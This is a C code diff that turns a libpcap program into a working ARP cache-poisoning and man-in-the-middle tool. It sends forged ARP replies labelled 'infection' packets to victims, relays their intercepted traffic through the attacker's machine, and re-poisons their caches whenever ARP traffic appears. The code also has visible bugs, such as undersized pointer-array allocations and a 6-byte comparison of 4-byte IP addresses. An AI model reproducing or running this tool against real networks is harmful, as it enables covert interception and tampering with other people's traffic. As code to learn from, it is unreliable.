@@ -52,6 +52,8 @@ unsigned char* IPstr2char(char* IPstr);
 struct ARPFrame* SetARPPacket(struct ARPFrame* arp_frame, unsigned char* dst_mac, unsigned char* src_mac, unsigned char* opcode, unsigned char* sendMAC, unsigned char* sendip, unsigned char* recvMAC, unsigned char* recvip);
 unsigned char* getMyIP(char* dev, unsigned char* myIP); 
 unsigned char* getSenderMAC(struct ARPFrame* recv_arp_frame, pcap_t *p, unsigned char* myMAC, unsigned char* myIP);
+void relay(pcap_t* p, unsigned char* senderMAC, unsigned char* targetMAC, unsigned char* myMAC, struct ARPFrame** infection_arp, int sessions);
+void sendInfectionARP(pcap_t* p, struct ARPFrame** infection_arp, int sessions);
 
 int main(int argc, char* argv[]) {
 	if(argc < 4){
@@ -65,19 +67,24 @@ int main(int argc, char* argv[]) {
 	}
 
 	char* dev = argv[1];
-	unsigned char** sendips = (unsigned char**)malloc((argc-2)/2);
-	unsigned char** sendmacs = (unsigned char**)malloc((argc-2)/2);
-	for(int i=0; i<(argc-2)/2; i++) {
+	int sessions = (argc-2)/2;
+	unsigned char** sendips = (unsigned char**)malloc(sessions);
+	unsigned char** sendmacs = (unsigned char**)malloc(sessions);
+	for(int i=0; i<sessions; i++) {
 		sendmacs[i] = (unsigned char*)malloc(6);
 	}
-	unsigned char** recvips = (unsigned char**)malloc((argc-2)/2);
+	unsigned char** recvips = (unsigned char**)malloc(sessions);
+	unsigned char** recvmacs = (unsigned char**)malloc(sessions);
+	for(int i=0; i<sessions; i++) {
+		recvmacs[i] = (unsigned char*)malloc(6);
+	}
+
 	unsigned char* myMAC = (unsigned char*)malloc(6);
 	unsigned char* myIP = (unsigned char*)malloc(4);
 	pcap_t *p;
 	char errbuf[PCAP_ERRBUF_SIZE];
 
-
-	for(int i=0; i<(argc-2)/2; i++) {
+	for(int i=0; i<sessions; i++) {
 		sendips[i] = IPstr2char(argv[i*2+2]);
 		recvips[i] = IPstr2char(argv[i*2+3]);
 	}
@@ -86,34 +93,42 @@ int main(int argc, char* argv[]) {
 	myIP = getMyIP(dev, myIP);
 	
 	struct ARPFrame arp_frame;
-	struct ARPFrame* parp_frame = &arp_frame;
-	
-	parp_frame = SetARPPacket(parp_frame, MACbroadcast, myMAC, REQUEST, myMAC, myIP, MACno, sendips[0]);
-	
-	p = pcap_open_live(dev, 65535, 0, 1000, errbuf);
-	pcap_sendpacket(p, (const u_char *)parp_frame, 42);
-	memset(parp_frame, 0, sizeof(parp_frame));
-
+	struct ARPFrame* parp_frame = (struct ARPFrame*)malloc(sizeof(struct ARPFrame));//= &arp_frame;
 	struct ARPFrame* precv_arp_frame;
 
-	memcpy(sendmacs[0], getSenderMAC(precv_arp_frame, p, myMAC, myIP), 6);
-	printf("%02x %02x %02x\n", sendmacs[0][3], sendmacs[0][4], sendmacs[0][5]);
+	struct ARPFrame arp_frame2;
+	struct ARPFrame* parp_frame2 = (struct ARPFrame*)malloc(sizeof(struct ARPFrame));
 
-	parp_frame = SetARPPacket(parp_frame, MACbroadcast, myMAC, REQUEST, myMAC, myIP, MACno, sendips[1]);
+	struct ARPFrame** infection_arp = (struct ARPFrame**)malloc(sessions);
+	for(int i=0; i<sessions; i++) {
+		infection_arp[i] = (struct ARPFrame*)malloc(sizeof(struct ARPFrame));
+	}
 
-	pcap_sendpacket(p, (const u_char *)parp_frame, 42);
-	memcpy(sendmacs[1], getSenderMAC(precv_arp_frame, p, myMAC, myIP), 6);
 
-	printf("%02x %02x %02x\n", sendmacs[0][3], sendmacs[0][4], sendmacs[0][5]);
+	p = pcap_open_live(dev, 65535, 0, 1000, errbuf);
 
-	printf("%02x\n", sendips[0][3]);
+	//get sender macs
+	for(int i=0; i<sessions; i++) {
+		parp_frame = SetARPPacket(parp_frame, MACbroadcast, myMAC, REQUEST, myMAC, myIP, MACno, sendips[i]);
+		pcap_sendpacket(p, (const u_char *)parp_frame, 42);
+		memcpy(sendmacs[i], getSenderMAC(precv_arp_frame, p, myMAC, myIP), 6);
+	}
+	//get target masc
+	for(int i=0; i<sessions; i++) {
+		parp_frame = SetARPPacket(parp_frame, MACbroadcast, myMAC, REQUEST, myMAC, myIP, MACno, recvips[i]);
+		pcap_sendpacket(p, (const u_char *)parp_frame, 42);
+		memcpy(recvmacs[i], getSenderMAC(precv_arp_frame, p, myMAC, myIP), 6);
+	}
 
-	parp_frame = SetARPPacket(parp_frame, sendmacs[0], myMAC, REPLY, myMAC, recvips[0], sendmacs[0], sendips[0]);
-	pcap_sendpacket(p, (const u_char *)parp_frame, 42);
 
-	parp_frame = SetARPPacket(parp_frame, sendmacs[1], myMAC, REPLY, myMAC, recvips[1], sendmacs[1], sendips[1]);
-	pcap_sendpacket(p, (const u_char *)parp_frame, 42);
+	//send defect arps
+	for(int i=0; i<sessions; i++) {
+		infection_arp[i] = SetARPPacket(infection_arp[i], sendmacs[i], myMAC, REPLY, myMAC, recvips[i], sendmacs[i], sendips[i]);
+	}
+	sendInfectionARP(p, infection_arp, sessions);
 
+	//relay
+	relay(p, sendmacs[0], recvmacs[0], myMAC, infection_arp, sessions);
 
 	return 0;
 
@@ -148,7 +163,7 @@ unsigned char* getSenderMAC(struct ARPFrame* recv_arp_frame, pcap_t* p, unsigned
 		struct pcap_pkthdr* header;
 		int res = pcap_next_ex(p, &header, &packet);
 		recv_arp_frame = (struct ARPFrame*)packet;
-		if(!memcmp(recv_arp_frame->ether_header.ETHERTYPE, ETHERTYPE, 2) && !memcmp(recv_arp_frame->arp.opcode, REPLY, 2) && !memcmp(recv_arp_frame->arp.recver_hw_addr, myMAC, 6) && !memcmp(recv_arp_frame->arp.recver_ip_addr, myIP, 6)){
+		if(memcmp(recv_arp_frame->ether_header.ETHERTYPE, ETHERTYPE, 2)==0 && memcmp(recv_arp_frame->arp.opcode, REPLY, 2)==0 && memcmp(recv_arp_frame->arp.recver_hw_addr, myMAC, 6)==0 && memcmp(recv_arp_frame->arp.recver_ip_addr, myIP, 6)==0){
 			sendermac = (unsigned char*)recv_arp_frame->ether_header.src_MAC;
 			break;
 		}
@@ -190,4 +205,69 @@ struct ARPFrame* SetARPPacket(struct ARPFrame* arp_frame, unsigned char* dst_mac
 
 	return arp_frame;
 }
+
+void relay(pcap_t* p, unsigned char* senderMAC, unsigned char* targetMAC, unsigned char* myMAC, struct ARPFrame** infection_arp, int sessions) {
+	const u_char* packet;
+	unsigned char* rel_packet;
+	struct pcap_pkthdr* header;
+	while(true){
+	int res = pcap_next_ex(p, &header, &packet);
+		rel_packet = (unsigned char*)malloc(header->caplen);
+		memcpy(rel_packet, packet, header->caplen);
+		if(memcmp(&(rel_packet[0]), myMAC, 6)==0 && memcmp(&(rel_packet[6]), senderMAC, 6)==0 && memcmp(&(rel_packet[0x0c]), ETHERTYPE, 2)!=0){
+			memcpy(rel_packet, targetMAC, 6);		
+			memcpy(rel_packet+6, myMAC, 6);	
+/*		printf("REQ\n");
+		printf("packet:");
+		for(int i=0; i<0x0f; i++)
+		printf("%02x ", packet[i]);	
+		printf("\n");
+		printf("rel_pk:");
+		for(int i=0; i<0x0f; i++)
+		printf("%02x ", rel_packet[i]);	
+		printf("\n");
+*/
+			pcap_sendpacket(p, (const u_char*)rel_packet, header->caplen);
+		}
+		else if(memcmp(&(rel_packet[0]), myMAC, 6)==0 && memcmp(&(rel_packet[6]), targetMAC, 6)==0 && memcmp(&(rel_packet[0x0c]), ETHERTYPE, 2)!=0) {
+			memcpy(rel_packet, senderMAC, 6);
+			memcpy(rel_packet+6, myMAC, 6);
+/*		printf("APY\n");
+		printf("packet:");
+		for(int i=0; i<0x0f; i++)
+		printf("%02x ", packet[i]);	
+		printf("\n");
+		printf("rel_pk:");
+		for(int i=0; i<0x0f; i++)
+		printf("%02x ", rel_packet[i]);	
+		printf("\n");
+*/
+
+			pcap_sendpacket(p, (const u_char*)rel_packet, header->caplen);
+		}
+		//reinfection
+		//target's unicast
+		else if(memcmp(&(rel_packet[0]), myMAC, 6)==0 && memcmp(&(rel_packet[6]), targetMAC, 6)==0 && memcmp(&(rel_packet[0x0c]), ETHERTYPE, 2)==0) {
+			sendInfectionARP(p, infection_arp, sessions);
+		}
+		//sender's unicast
+		else if(memcmp(&(rel_packet[0]), myMAC, 6)==0 && memcmp(&(rel_packet[6]), senderMAC,6)==0 && memcmp(&(rel_packet[0x0c]), ETHERTYPE, 2)==0) {
+			sendInfectionARP(p, infection_arp, sessions);
+		}
+		//target's broadcast
+		else if(memcmp(&(rel_packet[0]), MACbroadcast, 6)==0 && memcmp(&(rel_packet[6]), targetMAC,6)==0 && memcmp(&(rel_packet[0x0c]), ETHERTYPE, 2)==0) {
+			sendInfectionARP(p, infection_arp, sessions);
+		}
+		//sender's broadcast
+		else if(memcmp(&(rel_packet[0]), MACbroadcast, 6)==0 && memcmp(&(rel_packet[6]), senderMAC,6)==0 && memcmp(&(rel_packet[0x0c]), ETHERTYPE, 2)==0) {
+			sendInfectionARP(p, infection_arp, sessions);
+		}
+	}
+}
+void sendInfectionARP(pcap_t* p, struct ARPFrame** infection_arp, int sessions) {
+	for(int i=0; i<sessions; i++) {
+		pcap_sendpacket(p, (const u_char *)infection_arp[i], 42);
+	}
+}
+
 
